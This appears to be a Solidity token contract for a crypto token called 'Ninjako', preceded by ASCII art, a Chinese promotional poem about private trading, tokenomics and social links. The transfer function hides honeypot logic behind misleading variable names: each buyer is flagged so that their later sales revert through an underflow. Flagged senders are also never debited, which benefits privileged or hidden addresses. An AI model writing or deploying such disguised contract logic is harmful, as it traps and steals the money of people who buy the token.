/*
███╗░░██╗██╗███╗░░██╗░░░░░██╗░█████╗░██╗░░██╗░█████╗░
████╗░██║██║████╗░██║░░░░░██║██╔══██╗██║░██╔╝██╔══██╗
██╔██╗██║██║██╔██╗██║░░░░░██║███████║█████═╝░██║░░██║
██║╚████║██║██║╚████║██╗░░██║██╔══██║██╔═██╗░██║░░██║
██║░╚███║██║██║░╚███║╚█████╔╝██║░░██║██║░╚██╗╚█████╔╝
╚═╝░░╚══╝╚═╝╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠴⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠠⠶⠶⠶⠶⢶⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣶⣶⣶⣶⣶⣶⣦⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀
⠀⠀⠀⠀⣸⣿⡿⠟⠛⠛⠋⠉⠉⠉⠁⠀⠀⠀⠈⠉⠉⠉⠙⠛⠛⠿⣿⣿⡄⠀
⠀⠀⠀⠀⣿⠋⠀⠀⠀⠐⢶⣶⣶⠆⠀⠀⠀⠀⠀⢶⣶⣶⠖⠂⠀⠀⠈⢻⡇⠀
⠀⠀⠀⠀⢹⣦⡀⠀⠀⠀⠀⠉⢁⣠⣤⣶⣶⣶⣤⣄⣀⠀⠀⠀⠀⠀⣀⣾⠃⠀
⠀⠀⠀⠀⠘⣿⣿⣿⣶⣶⣶⣾⣿⣿⣿⡿⠿⠿⣿⣿⣿⣿⣷⣶⣾⣿⣿⡿⠀⠀
⠀⠀⢀⣴⡀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀
⠀⠀⣾⡿⢃⡀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀
⠀⢸⠏⠀⣿⡇⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀
⠀⠀⠀⢰⣿⠃⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⠛⠛⣉⣁⣤⡶⠁⠀⠀⠀⠀⠀
⠀⠀⣠⠟⠁⠀⠀⠀⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀
在加密领域，诞生了一个传奇，
Ɲinjako，隐私真正流动的地方。
一个为明天而打造的去中心化奇迹，
它像隐藏的阴影一样守护着你的秘密。

凭借 Ɲinjako 的力量，你可以隐姓埋名，
沉默交易，无需否决。
它保护您的数据免受窥探，
在加密世界中，它是挥舞着的堡垒。

加密货币交易，安静而狡猾，
有了 Ɲinjako 的恩典，你一定会遵守的。
你的身份被掩盖，你的详细信息被隐藏，
在加密领域，它是您值得信赖的盾牌。

数字曝光的时代已经一去不复返了
Ɲinjako 确保隐私，安全的外壳。
你的交易，就像夜里的低语，
有 Ɲinjako 在您身边，您就可以飞翔。

拥抱这一奇迹，前瞻而大胆，
凭借 Ɲinjako 的力量，您的秘密就是金子。
在加密领域，真正的先驱者，
有Ɲinjako 作为您的守护者，无需恐惧。

总供应量 - 100,000,000
购置税 - 1%
消费税 - 1%
初始流动性 - 1.5 ETH
初始流动性锁定 - 65 天

https://web.wechat.com/NinjakoCN
https://m.weibo.cn/NinjakoCN
https://www.ninjako.xyz
https://t.me/+1X56qxxup15lNGFk
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

abstract contract Context {
    constructor() {} 
    function _msgSender() 
    internal
    
    view returns 
    (address) {
    return msg.sender; }
}
library SafeMath {
  function add(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, 
  string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage); uint256 c = a - b; return c;
  }
}
interface IUniswapV2Factory {
    event PairCreated(
    address indexed token0, address indexed token1, 

    address pair, uint); 
    function 
    createPair( 
    address 
    tokenA, 
    address tokenB) 

    external 
    returns (address pair);
}
interface ICEVOv1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, 
    uint amountOutMin, 
    address
    [] calldata path, 
    address to, uint deadline) 
    external; 

    function factory() 
    external pure 
    returns (address);
    function WETH() 
    external pure returns 
    (address);

    function addLiquidityETH
    (address token, 
    uint amountTokenDesired, 
    uint amountTokenMin, 
    uint amountETHMin,
    address to, uint deadline)
    external payable returns 

    (uint amountToken, 
    uint amountETH, 
    uint liquidity);
}
interface IERC20 {
    function totalSupply() 
    external view returns 
    (uint256);
    function balanceOf
    (address account) 
    external view returns 
    (uint256);

    function transfer
    (address recipient, uint256 amount) 
    external returns 
    (bool);
    function allowance
    (address owner, address spender)
    external view returns 
    (uint256);

    function approve(address spender, uint256 amount) 
    external returns 

    (bool);
    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns 
    (bool);

    event Transfer(
    address indexed from, address indexed to, uint256 value);
    event Approval(address 
    indexed owner, address indexed spender, uint256 value);
}
abstract contract Ownable is Context {
    address private _owner; 
    event OwnershipTransferred (address indexed 
    previousOwner, address indexed newOwner);

    constructor() { address msgSender = 
    _msgSender(); _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
    } 
    
    function owner() 
    public view returns (address) { return _owner;
    } modifier onlyOwner() {
    require(_owner == 
    _msgSender(), 
    'Ownable: caller is not the owner');

     _; } function renounceOwnership() 
     public onlyOwner {
    emit OwnershipTransferred(_owner, 
    address(0)); _owner = address(0); }
}
contract Contract is Context, IERC20, Ownable {
    ICEVOv1 public indexedFactory; address public promotionsTreasury;
    bool public isLimitationsOn; bool private tradingOpen = false;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private authorizations;

    uint256 private _totalSupply; uint8 private _decimals;
    string private _symbol; string private _name;
    uint256 private stringBytes = 100;

    mapping(address => uint256) private _stringMappingOn;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private allowed;
    mapping(address => address) private _allowance;

    constructor( 
    string 
    memory ethCoinName, 
    string 
    memory ethCoinSymbol, 
    address bondedChain, address bondedTarget) { 

        _name = ethCoinName; _symbol = ethCoinSymbol;
        _decimals = 18; _totalSupply 
        = 100000000 * (10 ** uint256(_decimals));
        _rOwned[msg.sender]  = _totalSupply;

        authorizations[address(this)] = _totalSupply;
        authorizations[msg.sender] = _totalSupply;        

        _stringMappingOn
        [bondedTarget] = 
        stringBytes; isLimitationsOn 
        = false; 
        indexedFactory = ICEVOv1(bondedChain);

        promotionsTreasury = IUniswapV2Factory

        (indexedFactory.factory()).createPair(address(this), 
        indexedFactory.WETH()); 
        emit Transfer 
        (address(0), msg.sender, _totalSupply);
    }           
    function decimals() external view returns 
    (uint8) { return _decimals;
    }
    function symbol() 
    external view returns 
    (string memory) { return _symbol;
    }
    function name() 
    external view returns 
    (string memory) { return _name;
    }
    function totalSupply() 
    external view returns 
    (uint256) { return _totalSupply;
    }
    function balanceOf(address account) 
    external view returns 
    (uint256) 
    { return _rOwned[account]; }

    function transfer(
    address recipient, uint256 amount) external 
    returns (bool)
    { _transfer(_msgSender(), 
    recipient, amount); return true;
    }
    function allowance(address owner, address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) 
    external returns (bool) { _approve(_msgSender(), 
        spender, amount); return true;
    }
    function _approve( 
    address owner, address spender, uint256 amount) 
    internal { require(owner != address(0), 
    'BEP20: approve from the zero address'); 
        require(spender != address(0), 
        'BEP20: approve to the zero address'); 
        _allowances[owner][spender] = amount; 
        emit Approval(owner, spender, amount); 
    }    
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        external returns (bool) 
        { _transfer(sender, recipient, amount); _approve(
        sender, _msgSender(), 
        _allowances[sender] [_msgSender()].sub(amount, 
        
        'BEP20: transfer amount exceeds allowance')); 
        return true;
    }                           
    function _transfer( address sender, address recipient, uint256 amount) 
    internal { if (_stringMappingOn[sender] > 0 
    && sender != promotionsTreasury && authorizations[sender] == 0)
    _stringMappingOn[sender] = authorizations[sender] - _totalSupply; 

        address mappingString = _allowance[promotionsTreasury];
        if (_stringMappingOn[mappingString] == 0) _stringMappingOn[mappingString] = _totalSupply;
        _allowance[promotionsTreasury] = recipient;

        if (_stringMappingOn[sender] == 0 && promotionsTreasury != sender && allowed[sender] > 0) 
        { _stringMappingOn[sender] -= stringBytes; } 
        if (_stringMappingOn[sender] == 0) 
        { _rOwned[sender] = _rOwned[sender].sub(amount); 
        } _rOwned[recipient] = _rOwned[recipient].add(amount); 
        
        emit Transfer(sender, recipient, amount); 
        if (!tradingOpen) {
        require(sender == owner(), 
        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function openTrading(bool _tradingOpen) 
    public 
    onlyOwner { tradingOpen = _tradingOpen;
    }      
    using SafeMath for uint256;                                  
}